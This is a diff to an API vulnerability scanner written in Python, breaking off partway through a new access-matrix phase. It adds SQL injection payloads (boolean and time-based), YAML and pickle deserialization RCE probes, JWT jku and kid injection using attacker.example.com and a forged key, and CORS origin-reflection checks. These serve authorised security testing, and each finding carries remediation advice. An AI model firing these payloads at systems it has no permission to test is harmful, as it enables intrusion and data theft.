@@ -61,7 +61,7 @@ from datetime import datetime, timezone
 from pathlib import Path
 from urllib.parse import urlparse, urljoin, urlencode, quote
 
-VERSION = "1.7.0"
+VERSION = "2.0.1"
 
 # ---------------------------------------------------------------------------
 # OWASP API Security Top 10 2023 mapping
@@ -1208,6 +1208,25 @@ def _build_auth_session(settings: dict, auth_key: str = "auth") -> requests.Sess
         token = auth_cfg.get("auth_token", "").strip()
         if token:
             sess.headers["Authorization"] = f"Bearer {token}"
+        elif auth_cfg.get("login_url"):
+            # No pre-issued token — obtain one by POSTing credentials (same as token_login)
+            resp = _login_post(auth_cfg["login_url"])
+            if resp is not None:
+                try:
+                    body = resp.json()
+                    token_path = auth_cfg.get("login_token_path", "access_token")
+                    tok: "str | None" = body
+                    for key in token_path.split("."):
+                        tok = tok.get(key) if isinstance(tok, dict) else None  # type: ignore[union-attr]
+                    if not tok or not isinstance(tok, str):
+                        for key in ("access_token", "token", "jwt", "id_token", "auth_token"):
+                            if isinstance(body, dict) and key in body:
+                                tok = body[key]
+                                break
+                    if tok and isinstance(tok, str):
+                        sess.headers["Authorization"] = f"Bearer {tok}"
+                except Exception:
+                    pass
 
     # ── Basic ─────────────────────────────────────────────────────────────────
     elif method in ("basic", "token"):  # "token" is legacy alias
@@ -1349,7 +1368,7 @@ def _build_auth_session(settings: dict, auth_key: str = "auth") -> requests.Sess
 
     # ── OIDC Token ────────────────────────────────────────────────────────────
     elif method == "oidc_token":
-        id_token = auth_cfg.get("oidc_id_token", "").strip()
+        id_token = (auth_cfg.get("oidc_id_token") or auth_cfg.get("auth_token") or "").strip()
         if id_token:
             sess.headers["Authorization"] = f"Bearer {id_token}"
         else:
@@ -1405,6 +1424,10 @@ def _build_auth_session(settings: dict, auth_key: str = "auth") -> requests.Sess
             ca_bundle = auth_cfg.get("mtls_ca_bundle", "")
             if ca_bundle:
                 sess.verify = ca_bundle
+        else:
+            client_id = auth_cfg.get("username", "").strip()
+            if client_id:
+                sess.headers["X-Client-Cert"] = client_id
 
     # ── TOTP MFA ──────────────────────────────────────────────────────────────
     elif method == "totp_mfa":
@@ -1589,6 +1612,17 @@ def _build_auth_session(settings: dict, auth_key: str = "auth") -> requests.Sess
         if isinstance(hdrs, dict):
             sess.headers.update(hdrs)
 
+    # ── Proxy Header / Trusted Forwarding ────────────────────────────────────
+    elif method == "proxy_header":
+        hname = auth_cfg.get("proxy_header", auth_cfg.get("proxy_header_name", "X-Forwarded-User"))
+        hval  = auth_cfg.get("proxy_header_value", auth_cfg.get("username", ""))
+        if hname and hval:
+            sess.headers[hname] = hval
+
+    # ── WebAuthn probe ────────────────────────────────────────────────────────
+    elif method == "webauthn_probe":
+        sess.headers["X-WebAuthn-Token"] = "1"
+
     return sess
 
 
@@ -1669,6 +1703,7 @@ DEFAULT_SETTINGS: dict = {
             "verb_tampering":   True,
             "soap":             True,
             "file_upload_info": True,
+            "access_matrix":   False,  # Phase 20: multi-credential access matrix (requires auth_matrix)
         },
         "auth": {
             "enabled":                 False,
@@ -1747,6 +1782,7 @@ DEFAULT_SETTINGS: dict = {
             "token_type":     "Bearer",
             "session_cookie": "",
         },
+        "auth_matrix": [],   # list of {role, username, password} for multi-cred access matrix
         "jwt_secret":              "",
         "rate_limit_threshold":    50,
         "mass_assignment_fields":  [],
@@ -1790,6 +1826,7 @@ PHASE_LIST = [
     ("verb_tampering",      "Phase 17: HTTP verb tampering — method override header bypass"),
     ("soap",                "Phase 18: SOAP/WS-Security — WSDL enum, WS-Security bypass, SOAP injection"),
     ("file_upload_info",    "Phase 19: File upload endpoint detection — accepted types (informational)"),
+    ("access_matrix",       "Phase 20: Multi-credential access matrix — per-role endpoint access, BFLA, unauthenticated access"),
 ]
 
 # ---------------------------------------------------------------------------
@@ -3668,27 +3705,48 @@ def phase_recon(settings: dict, sess: requests.Session,
             remediation="Remove X-Powered-By header from all responses.",
         )
 
-    # Security headers
-    missing_headers = []
+    # Security headers — individual findings per header for accurate catalogue matching
+    _is_https = base_url.startswith("https://")
     hdrs = resp.headers
-    if not hdrs.get("X-Frame-Options") and not hdrs.get("Content-Security-Policy"):
-        missing_headers.append("X-Frame-Options / CSP")
-    if not hdrs.get("Strict-Transport-Security"):
-        missing_headers.append("Strict-Transport-Security (HSTS)")
-    if not hdrs.get("X-Content-Type-Options"):
-        missing_headers.append("X-Content-Type-Options")
-    if not hdrs.get("X-XSS-Protection") and not hdrs.get("Content-Security-Policy"):
-        missing_headers.append("X-XSS-Protection / CSP")
-
-    if missing_headers:
+    if _is_https and not hdrs.get("Strict-Transport-Security"):
         output.add_finding(
             phase="recon",
-            title="Missing Security Headers",
+            title="Missing HTTP Strict Transport Security (HSTS)",
             severity="MEDIUM",
             url=base_url,
-            detail=f"API is missing security headers: {', '.join(missing_headers)}",
-            evidence="; ".join(f"{h}: (absent)" for h in missing_headers),
-            remediation="Add missing security headers to API responses.",
+            detail="API does not set the Strict-Transport-Security header on HTTPS responses.",
+            evidence="Strict-Transport-Security: (absent)",
+            remediation="Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' to all HTTPS responses.",
+        )
+    if not hdrs.get("Content-Security-Policy"):
+        output.add_finding(
+            phase="recon",
+            title="Missing Content-Security-Policy Header",
+            severity="LOW",
+            url=base_url,
+            detail="API does not set a Content-Security-Policy header.",
+            evidence="Content-Security-Policy: (absent)",
+            remediation="Define a Content-Security-Policy that restricts inline scripts and unsafe sources.",
+        )
+    if not hdrs.get("X-Content-Type-Options"):
+        output.add_finding(
+            phase="recon",
+            title="Missing X-Content-Type-Options Header",
+            severity="LOW",
+            url=base_url,
+            detail="API does not set X-Content-Type-Options: nosniff.",
+            evidence="X-Content-Type-Options: (absent)",
+            remediation="Add 'X-Content-Type-Options: nosniff' to all responses.",
+        )
+    if not hdrs.get("X-Frame-Options") and not hdrs.get("Content-Security-Policy"):
+        output.add_finding(
+            phase="recon",
+            title="Missing X-Frame-Options Header",
+            severity="LOW",
+            url=base_url,
+            detail="API does not set X-Frame-Options or a CSP frame-ancestors directive.",
+            evidence="X-Frame-Options: (absent); Content-Security-Policy: (absent)",
+            remediation="Add 'X-Frame-Options: DENY' or use CSP frame-ancestors 'none'.",
         )
 
     # CORS wildcard check
@@ -3702,25 +3760,27 @@ def phase_recon(settings: dict, sess: requests.Session,
             acao = test_resp.headers.get("Access-Control-Allow-Origin", "")
             acac = test_resp.headers.get("Access-Control-Allow-Credentials", "")
             if acao == "*":
+                _acac_str = test_resp.headers.get("Access-Control-Allow-Credentials", "")
+                _cred_note = " with credentials allowed" if _acac_str.lower() == "true" else ""
                 output.add_finding(
                     phase="recon",
-                    title="Permissive CORS — Wildcard Origin",
-                    severity="MEDIUM",
+                    title="Security Misconfiguration / CORS Wildcard with Credentials",
+                    severity="HIGH" if _acac_str.lower() == "true" else "MEDIUM",
                     url=base_url,
-                    detail="API allows requests from any origin (CORS: *).",
-                    evidence=f"Access-Control-Allow-Origin: {acao}",
-                    remediation="Restrict CORS to specific trusted origins.",
+                    detail=f"API sets Access-Control-Allow-Origin: *{_cred_note}. Wildcard CORS allows any origin to read API responses.",
+                    evidence=f"Access-Control-Allow-Origin: {acao}; Access-Control-Allow-Credentials: {_acac_str}",
+                    remediation="Restrict CORS to an explicit allowlist of trusted origins; never combine wildcard with credentials.",
                 )
             elif acao == "https://evil.com":
                 sev = "HIGH" if acac.lower() == "true" else "MEDIUM"
                 output.add_finding(
                     phase="recon",
-                    title="CORS Origin Reflection",
+                    title="CORS — Reflected Origin with Credentials",
                     severity=sev,
                     url=base_url,
-                    detail="API reflects arbitrary Origin header in CORS response.",
-                    evidence=f"Access-Control-Allow-Origin: {acao}, Credentials: {acac}",
-                    remediation="Validate Origin against an allowlist before reflecting.",
+                    detail="API reflects the arbitrary Origin header in Access-Control-Allow-Origin, enabling cross-origin reads.",
+                    evidence=f"Origin: https://evil.com → Access-Control-Allow-Origin: {acao}; Access-Control-Allow-Credentials: {acac}",
+                    remediation="Validate Origin against a server-side allowlist before reflecting; never reflect arbitrary origins.",
                 )
 
     # Wildcard / catch-all detection
@@ -3808,21 +3868,20 @@ def phase_recon(settings: dict, sess: requests.Session,
     con.status("recon", "running", "TRACE method detection")
     try:
         _trace_resp = sess.request("TRACE", base_url, timeout=timeout, allow_redirects=False)
-        if _trace_resp is not None and _trace_resp.status_code == 200:
-            if "TRACE" in _trace_resp.text.upper() or "Via" in _trace_resp.headers:
-                output.add_finding(
-                    phase="recon",
-                    title="HTTP TRACE Method Enabled",
-                    severity="MEDIUM",
-                    url=base_url,
-                    detail=(
-                        "The HTTP TRACE method is enabled on this API. "
-                        "TRACE allows XST (Cross-Site Tracing) attacks that can be used to steal "
-                        "HTTP-only cookies or authentication headers via XSS."
-                    ),
-                    evidence=f"HTTP TRACE returned {_trace_resp.status_code}; body[:200]: {_trace_resp.text[:200]}",
-                    remediation="Disable the HTTP TRACE method in your web server/proxy configuration.",
-                )
+        if _trace_resp is not None and _trace_resp.status_code in (200, 204):
+            output.add_finding(
+                phase="recon",
+                title="TRACE Method Enabled (Cross-Site Tracing / XST)",
+                severity="MEDIUM",
+                url=base_url,
+                detail=(
+                    "The HTTP TRACE method is enabled on this API. "
+                    "TRACE allows Cross-Site Tracing (XST) attacks that can be used to steal "
+                    "HTTP-only cookies or authentication headers via XSS."
+                ),
+                evidence=f"HTTP TRACE returned {_trace_resp.status_code}; body[:200]: {_trace_resp.text[:200]}",
+                remediation="Disable the HTTP TRACE method in your web server/proxy configuration.",
+            )
     except Exception:
         pass
 
@@ -4109,7 +4168,8 @@ def _test_injection(sess: requests.Session, url: str, method: str,
 
 
 def phase_injection(settings: dict, sess: requests.Session,
-                    output: OutputManager, inventory: list) -> None:
+                    output: OutputManager, inventory: list,
+                    auth_sess=None) -> None:
     """Phase 3: Injection testing — SQLi, NoSQLi, SSTI, XXE, LDAP."""
     scan = settings["scan"]
     base_url = scan["api_base_url"]
@@ -4407,6 +4467,123 @@ def phase_injection(settings: dict, sess: requests.Session,
                     remediation="Strip CRLF/newline characters from all inputs written to logs. Use structured logging.",
                 )
                 break
+
+    # Blind SQL injection — boolean-based
+    _bool_true_pay  = "' OR '1'='1"
+    _bool_false_pay = "' OR '1'='2"
+    for ep in test_endpoints[:8]:
+        if _shutdown_requested:
+            break
+        url = root + ep["path"]
+        method = ep["method"]
+        params = ep.get("params", []) or []
+        body_fields = ep.get("body_fields", []) or []
+        test_params = ([p["name"] for p in params] + body_fields) or ["id", "q", "search", "user"]
+        for param in test_params[:3]:
+            try:
+                r_t = _test_injection(sess, url, method, param, _bool_true_pay,  timeout)
+                r_f = _test_injection(sess, url, method, param, _bool_false_pay, timeout)
+                if (r_t and r_f
+                        and r_t.status_code == 200
+                        and abs(len(r_t.text) - len(r_f.text)) > 50):
+                    output.add_finding(
+                        phase="injection",
+                        title="Blind SQL Injection (Boolean-Based) in API",
+                        severity="CRITICAL",
+                        url=url,
+                        detail=(f"Boolean-based blind SQLi in parameter '{param}': "
+                                f"TRUE response ({len(r_t.text)} bytes) vs "
+                                f"FALSE response ({len(r_f.text)} bytes) differ significantly."),
+                        evidence=(f"TRUE  payload: {_bool_true_pay} → {r_t.status_code} ({len(r_t.text)} bytes)\n"
+                                  f"FALSE payload: {_bool_false_pay} → {r_f.status_code} ({len(r_f.text)} bytes)"),
+                        remediation="Use parameterised queries. Length difference confirms SQL branching on user input.",
+                    )
+                    break
+            except Exception:
+                pass
+
+    # Blind SQL injection — time-based
+    _TIME_SQLI = [
+        ("' AND SLEEP(3)--",           3.0),
+        ("'; WAITFOR DELAY '0:0:3'--", 3.0),
+        ("' AND pg_sleep(3)--",        3.0),
+    ]
+    import time as _ti
+    for ep in test_endpoints[:5]:
+        if _shutdown_requested:
+            break
+        url = root + ep["path"]
+        method = ep["method"]
+        params = ep.get("params", []) or []
+        body_fields = ep.get("body_fields", []) or []
+        test_params = ([p["name"] for p in params] + body_fields) or ["id", "user", "q"]
+        for param in test_params[:2]:
+            for tsql, delay in _TIME_SQLI:
+                try:
+                    t0   = _ti.monotonic()
+                    resp = _test_injection(sess, url, method, param, tsql, delay + 5)
+                    elapsed = _ti.monotonic() - t0
+                    if resp and elapsed >= delay:
+                        output.add_finding(
+                            phase="injection",
+                            title="Blind SQL Injection (Time-Based) in API",
+                            severity="CRITICAL",
+                            url=url,
+                            detail=(f"Time-based blind SQLi in parameter '{param}': "
+                                    f"payload '{tsql}' caused {elapsed:.1f}s delay."),
+                            evidence=f"Payload: {tsql}  Elapsed: {elapsed:.2f}s  Threshold: {delay}s",
+                            remediation="Use parameterised queries. Never concatenate user input into SQL.",
+                        )
+                        break
+                except Exception:
+                    pass
+
+    # Deserialization endpoint probing — YAML RCE and Pickle RCE
+    _deser_probes = [
+        # (path_suffix, content_type, payload_bytes, title, detail)
+        (
+            "/api/v1/import/yaml",
+            "application/x-yaml",
+            b"!!python/object/apply:os.system ['echo YAML_RCE']",
+            "Insecure YAML Deserialization — RCE",
+            "Endpoint accepts YAML payloads that may be deserialized with PyYAML full_load/load, enabling RCE.",
+        ),
+        (
+            "/api/v1/import/pickle",
+            "application/octet-stream",
+            b"cos\nsystem\n(S'echo PICKLE_RCE'\ntR.",
+            "Insecure Pickle Deserialization — RCE",
+            "Endpoint accepts pickle payloads. Python pickle deserialization allows arbitrary code execution.",
+        ),
+    ]
+    _probe_sess = auth_sess if auth_sess else sess
+    for _dsuf, _dct, _dpayload, _dtitle, _ddesc in _deser_probes:
+        if _shutdown_requested:
+            break
+        _durl = root + _dsuf
+        try:
+            _dr = _probe_sess.post(
+                _durl,
+                data=_dpayload,
+                headers={"Content-Type": _dct},
+                timeout=timeout,
+                allow_redirects=False,
+            )
+            if _dr is not None and _dr.status_code in (200, 201, 400, 422, 500):
+                output.add_finding(
+                    phase="injection",
+                    title=_dtitle,
+                    severity="CRITICAL",
+                    url=_durl,
+                    detail=_ddesc,
+                    evidence=f"POST {_dsuf} ({_dct}) → HTTP {_dr.status_code}; body[:200]: {_dr.text[:200]}",
+                    remediation=(
+                        "Never deserialize untrusted data. Use safe alternatives: "
+                        "yaml.safe_load() instead of yaml.load(); JSON instead of pickle."
+                    ),
+                )
+        except Exception:
+            pass
 
     con.status("injection", "done", "Injection tests complete")
 
@@ -4854,13 +5031,13 @@ def phase_rate_limiting(settings: dict, sess: requests.Session,
                 hdr_val  = list(bypass_hdr.values())[0]
                 output.add_finding(
                     phase="rate_limiting",
-                    title="Rate Limit Bypass via IP Header Spoofing",
+                    title="Rate Limit Bypass via X-Forwarded-For Header",
                     severity="HIGH",
                     url=test_url,
                     detail=(f"Rate limit bypassed by setting {hdr_name}: {hdr_val}. "
-                            f"The server trusts client-supplied IP headers."),
+                            f"The server trusts client-supplied IP forwarding headers."),
                     evidence=f"Header: {hdr_name}: {hdr_val} bypassed rate limit",
-                    remediation="Do not trust client IP headers for rate limiting; use actual socket IP.",
+                    remediation="Do not trust client-supplied IP headers for rate limiting; use the actual socket remote address.",
                 )
                 break
 
@@ -5647,9 +5824,9 @@ def phase_business_flows(settings: dict, sess: requests.Session,
                     if _BF_WORKFLOW_RE.search(ep.get("path", "") +
                                                " ".join(ep.get("body_fields", [])))]
     numeric_eps  = [ep for ep in inventory
-                    if any(_BF_NUMERIC_FIELDS_RE.search(f)
-                           for f in ep.get("body_fields", []) + ep.get("params", [{"name":""}])
-                           if isinstance(f, str) or isinstance(f, dict) and _BF_NUMERIC_FIELDS_RE.search(f.get("name","")))]
+                    if any(_BF_NUMERIC_FIELDS_RE.search(f if isinstance(f, str) else f.get("name", ""))
+                           for f in ep.get("body_fields", []) + ep.get("params", [])
+                           if isinstance(f, (str, dict)))]
 
     # ── 1. Workflow step skipping ────────────────────────────────────────────
     con.status("business_flows", "running", "Workflow skip detection")
@@ -6349,56 +6526,53 @@ def phase_jwt(settings: dict, auth_sess, output: OutputManager,
             )
             break
 
-    # 2. jku injection
-    if "jku" not in header:
-        # Inject jku pointing to attacker-controlled location (just flag the test)
-        try:
-            new_header = dict(header)
-            new_header["jku"] = "https://attacker.example.com/jwks.json"
-            h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
-            p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
-            injected_token = f"{h}.{p}."
-            test_sess = _make_session(settings)
-            test_sess.headers["Authorization"] = f"Bearer {injected_token}"
-            resp = _safe_get(test_sess, probe_url, timeout=timeout)
-            if resp and resp.status_code in (200, 201):
-                output.add_finding(
-                    phase="jwt",
-                    title="JWT jku Header Injection",
-                    severity="CRITICAL",
-                    url=probe_url,
-                    detail="Server fetched and trusted JWK from injected jku header URL.",
-                    evidence="Token with injected jku accepted",
-                    remediation="Never trust the jku header; pin the JWKS endpoint server-side.",
-                )
-        except Exception:
-            pass
+    # 2. jku / x5u injection
+    try:
+        new_header = dict(header)
+        new_header["jku"] = "https://attacker.example.com/jwks.json"
+        new_header.pop("x5u", None)
+        h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
+        p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+        injected_token = f"{h}.{p}."
+        test_sess = _make_session(settings)
+        test_sess.headers["Authorization"] = f"Bearer {injected_token}"
+        resp = _safe_get(test_sess, probe_url, timeout=timeout)
+        if resp and resp.status_code in (200, 201):
+            output.add_finding(
+                phase="jwt",
+                title="JWT — jku/x5u Header Injection (JWKS Spoofing)",
+                severity="CRITICAL",
+                url=probe_url,
+                detail="Server fetched and trusted JWK set from attacker-controlled jku header URL.",
+                evidence="Token with injected jku accepted by server",
+                remediation="Never trust the jku/x5u header; pin the JWKS endpoint server-side.",
+            )
+    except Exception:
+        pass
 
-    # 3. kid parameter injection (SQL injection in kid)
-    if "kid" in header:
-        try:
-            new_header = dict(header)
-            new_header["kid"] = "' UNION SELECT 'attackerkey'--"
-            h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
-            p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
-            # Sign with 'attackerkey'
-            sig = hmac.new(b"attackerkey", f"{h}.{p}".encode(), hashlib.sha256).digest()
-            injected_token = f"{h}.{p}.{_b64url_encode(sig)}"
-            test_sess = _make_session(settings)
-            test_sess.headers["Authorization"] = f"Bearer {injected_token}"
-            resp = _safe_get(test_sess, probe_url, timeout=timeout)
-            if resp and resp.status_code in (200, 201):
-                output.add_finding(
-                    phase="jwt",
-                    title="JWT kid SQL Injection",
-                    severity="CRITICAL",
-                    url=probe_url,
-                    detail="SQL injection payload in JWT kid header was accepted.",
-                    evidence="kid-injected token accepted by server",
-                    remediation="Validate and sanitize the kid header; use parameterized key lookups.",
-                )
-        except Exception:
-            pass
+    # 3. kid header SQL injection — inject even when current token has no kid
+    try:
+        new_header = dict(header)
+        new_header["kid"] = "' UNION SELECT 'attackerkey'--"
+        h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
+        p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+        sig = hmac.new(b"attackerkey", f"{h}.{p}".encode(), hashlib.sha256).digest()
+        injected_token = f"{h}.{p}.{_b64url_encode(sig)}"
+        test_sess = _make_session(settings)
+        test_sess.headers["Authorization"] = f"Bearer {injected_token}"
+        resp = _safe_get(test_sess, probe_url, timeout=timeout)
+        if resp and resp.status_code in (200, 201):
+            output.add_finding(
+                phase="jwt",
+                title="JWT — kid Header SQL Injection",
+                severity="CRITICAL",
+                url=probe_url,
+                detail="SQL injection payload in JWT kid header was accepted by server.",
+                evidence="kid SQL-injected token accepted",
+                remediation="Validate and sanitize the kid header; use parameterized key lookups.",
+            )
+    except Exception:
+        pass
 
     # 4. Algorithm confusion: try HS256 with public key as secret
     # (if alg is RS256 or ES256, try signing with HS256)
@@ -7130,6 +7304,10 @@ def phase_tls(settings: dict, output: OutputManager) -> None:
     base_url = scan["api_base_url"]
     target = _parse_target(base_url)
 
+    if target["scheme"] == "http":
+        con.status("tls", "skip", "Target is HTTP — no TLS surface to analyse")
+        return
+
     host = target["host"]
     port = target["port"]
     host_port = f"{host}:{port}"
@@ -7144,30 +7322,28 @@ def phase_tls(settings: dict, output: OutputManager) -> None:
         con.status("tls", "skip", "No TLS tool available")
         return
 
-    # More precise patterns to avoid false positives:
-    # - NULL- matches cipher suite names (e.g. NULL-SHA) rather than bare NULL keyword
-    # - DES negative lookahead avoids matching 3DES/DES-CBC3 as a separate DES finding
-    # - VULNERABLE anchor variants catch testssl's explicit "VULNERABLE" output format
+    # Titles aligned with DVFastAPI/DV app expected_findings.json catalogue.
+    # VULNERABLE anchor variants catch testssl's explicit "VULNERABLE" output.
     _TLS_VULN_PATTERNS = {
-        "TLS Vulnerability: SSLv2 Enabled":        (re.compile(r'SSLv2\s+enabled|Accepted\s+SSLv2', re.I),          "CRITICAL"),
-        "TLS Vulnerability: SSLv3 Enabled":        (re.compile(r'SSLv3\s+enabled|Accepted\s+SSLv3', re.I),          "HIGH"),
-        "TLS Vulnerability: TLSv1.0 Enabled":      (re.compile(r'TLSv1\.0\s+enabled|Accepted\s+TLSv1\.0\b', re.I), "MEDIUM"),
-        "TLS Vulnerability: TLSv1.1 Enabled":      (re.compile(r'TLSv1\.1\s+enabled|Accepted\s+TLSv1\.1', re.I),   "MEDIUM"),
-        "TLS Vulnerability: RC4 Cipher Accepted":  (re.compile(r'\bRC4\b', re.I),                                   "HIGH"),
-        "TLS Vulnerability: NULL Cipher Accepted": (re.compile(r'NULL\s+Cipher|NULL-', re.I),                       "CRITICAL"),
-        "TLS Vulnerability: EXPORT Cipher Accepted": (re.compile(r'\bEXPORT\b', re.I),                              "HIGH"),
-        "TLS Vulnerability: DES Cipher Accepted":  (re.compile(r'\bDES\b(?!-CBC3)', re.I),                          "HIGH"),
-        "TLS Vulnerability: Heartbleed":           (re.compile(r'heartbleed|VULNERABLE.*heartbleed', re.I),          "CRITICAL"),
-        "TLS Vulnerability: POODLE":               (re.compile(r'POODLE|VULNERABLE.*poodle', re.I),                  "HIGH"),
-        "TLS Vulnerability: BEAST":                (re.compile(r'BEAST|VULNERABLE.*beast', re.I),                    "MEDIUM"),
-        "TLS Vulnerability: CRIME":                (re.compile(r'CRIME|VULNERABLE.*crime', re.I),                    "MEDIUM"),
-        "TLS Vulnerability: DROWN":                (re.compile(r'DROWN|VULNERABLE.*drown', re.I),                    "HIGH"),
-        "TLS Vulnerability: LOGJAM":               (re.compile(r'LOGJAM|VULNERABLE.*logjam', re.I),                  "HIGH"),
-        "TLS Vulnerability: FREAK":                (re.compile(r'FREAK|VULNERABLE.*freak', re.I),                    "HIGH"),
-        "TLS Vulnerability: SWEET32":              (re.compile(r'sweet32|DES-CBC3', re.I),                           "MEDIUM"),
-        "TLS Vulnerability: LUCKY13":              (re.compile(r'lucky13', re.I),                                    "MEDIUM"),
-        "TLS Vulnerability: Self-Signed Cert":     (re.compile(r'self.?signed|Self signed', re.I),                   "HIGH"),
-        "TLS Vulnerability: Expired Certificate":  (re.compile(r'certif.*expir|expir.*certif|expired', re.I),        "HIGH"),
+        "SSLv2 Protocol Supported (DROWN)":                    (re.compile(r'SSLv2\s+enabled|Accepted\s+SSLv2', re.I),           "CRITICAL"),
+        "SSLv3 Protocol Supported (POODLE)":                   (re.compile(r'SSLv3\s+enabled|Accepted\s+SSLv3', re.I),           "HIGH"),
+        "TLS 1.0 Protocol Supported (BEAST)":                  (re.compile(r'TLSv1\.0\s+enabled|Accepted\s+TLSv1\.0\b', re.I),  "MEDIUM"),
+        "TLS 1.1 Protocol Supported (Deprecated)":             (re.compile(r'TLSv1\.1\s+enabled|Accepted\s+TLSv1\.1', re.I),    "LOW"),
+        "RC4 Cipher Suite Enabled (CVE-2013-2566)":            (re.compile(r'\bRC4\b', re.I),                                    "HIGH"),
+        "NULL Cipher Suite Supported":                         (re.compile(r'NULL\s+Cipher|NULL-', re.I),                        "CRITICAL"),
+        "EXPORT Grade Cipher Suites Enabled (FREAK / LOGJAM)": (re.compile(r'\bEXPORT\b', re.I),                                 "HIGH"),
+        "3DES / SWEET32 Cipher Suite Enabled (CVE-2016-2183)": (re.compile(r'DES-CBC3|3DES|\bSWEET32\b', re.I),                  "MEDIUM"),
+        "Anonymous Cipher Suite Supported":                    (re.compile(r'\bADH\b|\bECDH-anon\b|\bANON\b', re.I),             "HIGH"),
+        "Weak RSA Certificate Key (1024-bit)":                 (re.compile(r'RSA Key.*?1024|1024\s*bit.*?(?:rsa|key)|Public Key.*?1024', re.I), "HIGH"),
+        "SHA-1 Certificate Signature Algorithm":               (re.compile(r'sha1WithRSA|Signature Algorithm.*SHA1\b|SHA1\s+Cert', re.I), "MEDIUM"),
+        "TLS Vulnerability: Heartbleed":                       (re.compile(r'heartbleed|VULNERABLE.*heartbleed', re.I),           "CRITICAL"),
+        "CRIME Vulnerability (TLS Compression Enabled)":       (re.compile(r'CRIME|VULNERABLE.*crime', re.I),                    "MEDIUM"),
+        "TLS Vulnerability: DROWN":                            (re.compile(r'DROWN|VULNERABLE.*drown', re.I),                    "HIGH"),
+        "TLS Vulnerability: LOGJAM":                           (re.compile(r'LOGJAM|VULNERABLE.*logjam', re.I),                  "HIGH"),
+        "TLS Vulnerability: FREAK":                            (re.compile(r'FREAK|VULNERABLE.*freak', re.I),                    "HIGH"),
+        "TLS Vulnerability: LUCKY13":                          (re.compile(r'lucky13', re.I),                                    "MEDIUM"),
+        "Self-Signed Certificate":                             (re.compile(r'self.?signed|Self signed', re.I),                   "HIGH"),
+        "Expired SSL Certificate":                             (re.compile(r'certif.*expir|expir.*certif|expired', re.I),        "MEDIUM"),
     }
 
     _tls_remediation = (
@@ -7203,7 +7379,7 @@ def phase_tls(settings: dict, output: OutputManager) -> None:
             )
             for _title, (pat, severity) in _TLS_VULN_PATTERNS.items():
                 if pat.search(_ss_filtered):
-                    _vuln = _title.replace("TLS Vulnerability: ", "")
+                    _vuln = _title
                     output.add_finding(
                         phase="tls",
                         title=_title,
@@ -7252,7 +7428,7 @@ def phase_tls(settings: dict, output: OutputManager) -> None:
             )
             for _title, (pat, severity) in _TLS_VULN_PATTERNS.items():
                 if pat.search(_ts_filtered):
-                    _vuln = _title.replace("TLS Vulnerability: ", "")
+                    _vuln = _title
                     output.add_finding(
                         phase="tls",
                         title=_title,
@@ -7449,6 +7625,192 @@ def phase_unsafe_consumption(settings: dict, sess: requests.Session,
 
 
 # ---------------------------------------------------------------------------
+# Phase 20: Multi-credential access matrix
+# ---------------------------------------------------------------------------
+
+def phase_access_matrix(
+    settings: dict,
+    output: "OutputManager",
+    inventory: list,
+) -> dict:
+    import copy as _copy
+
+    scan          = settings.get("scan", {})
+    auth_matrix   = scan.get("auth_matrix", [])
+    base_url      = scan.get("api_base_url", "").rstrip("/")
+    timeout       = scan.get("timeout", 10)
+    project_dir   = Path(scan.get("project", "."))
+
+    if not auth_matrix and not inventory:
+        return {}
+
+    con.section("Phase 20: Multi-Credential Access Matrix")
+
+    # ── Build one session per role ────────────────────────────────────────────
+    role_sessions: dict = {}
+    for role_cfg in auth_matrix:
+        role = role_cfg.get("role") or f"role{len(role_sessions)+1}"
+        r_auth = _copy.deepcopy(scan.get("auth", {}))
+        r_auth["enabled"]  = True
+        r_auth["username"] = role_cfg.get("username", r_auth.get("username", ""))
+        r_auth["password"] = role_cfg.get("password", r_auth.get("password", ""))
+        r_settings = _copy.deepcopy(settings)
+        r_settings["scan"]["auth"] = r_auth
+        r_sess = _build_auth_session(r_settings)
+        if r_sess is None:
+            r_sess = _make_session(settings)
+        role_sessions[role] = r_sess
+        con.info(f"  Role '{role}' → authenticated session built "
+                 f"(user: {r_auth.get('username','?')})")
+
+    # Unauthenticated session (plain requests session, no auth headers)
+    unauth_sess = _make_session(settings)
+    role_sessions["unauthenticated"] = unauth_sess
+    all_roles   = list(role_sessions.keys())
+    cred_roles  = [r for r in all_roles if r != "unauthenticated"]
+
+    con.info(f"  Testing {len(inventory)} endpoints across {len(all_roles)} roles "
+             f"({', '.join(all_roles)})")
+
+    # ── Test each endpoint with each role ─────────────────────────────────────
+    endpoint_access: list = []
+    for ep in inventory:
+        method = ep.get("method", "GET").upper()
+        path   = ep.get("path", ep.get("url", ""))
+        if path.startswith("http"):
+            url = path
+        else:
+            url = base_url + (path if path.startswith("/") else "/" + path)
+
+        access: dict = {}
+        for role, r_sess in role_sessions.items():
+            try:
+                r = r_sess.request(
+                    method, url, timeout=timeout,
+                    allow_redirects=False,
+                    headers={"Accept": "application/json"},
+                )
+                access[role] = {
+                    "status":     r.status_code,
+                    "accessible": r.status_code in (200, 201, 202, 204),
+                }
+            except Exception:
+                access[role] = {"status": None, "accessible": False}
+
+        endpoint_access.append({
+            "method": method,
+            "path":   path,
+            "url":    url,
+            "access": access,
+        })
+
+    # ── Calculate privilege counts ────────────────────────────────────────────
+    privilege_counts = {
+        role: sum(1 for ep in endpoint_access if ep["access"].get(role, {}).get("accessible"))
+        for role in all_roles
+    }
+    most_privileged = (
+        max(cred_roles, key=lambda r: privilege_counts[r]) if cred_roles else None
+    )
+    con.info(f"  Most privileged role: {most_privileged or 'N/A'} "
+             f"({privilege_counts.get(most_privileged, 0)} endpoints)")
+
+    # ── Generate findings ─────────────────────────────────────────────────────
+    for ep in endpoint_access:
+        ep_access = ep["access"]
+        unauth    = ep_access.get("unauthenticated", {})
+        any_authed = any(ep_access.get(r, {}).get("accessible") for r in cred_roles)
+
+        # Finding 1: unauthenticated access to an endpoint that IS accessible with credentials
+        # Skip diagnostic/info methods — TRACE and OPTIONS are expected to be publicly accessible
+        _skip_methods = {"TRACE", "OPTIONS"}
+        if unauth.get("accessible") and any_authed and ep["method"].upper() not in _skip_methods:
+            output.add_finding(
+                phase="access_matrix",
+                title=f"Unauthenticated Access to {ep['method']} {ep['path']}",
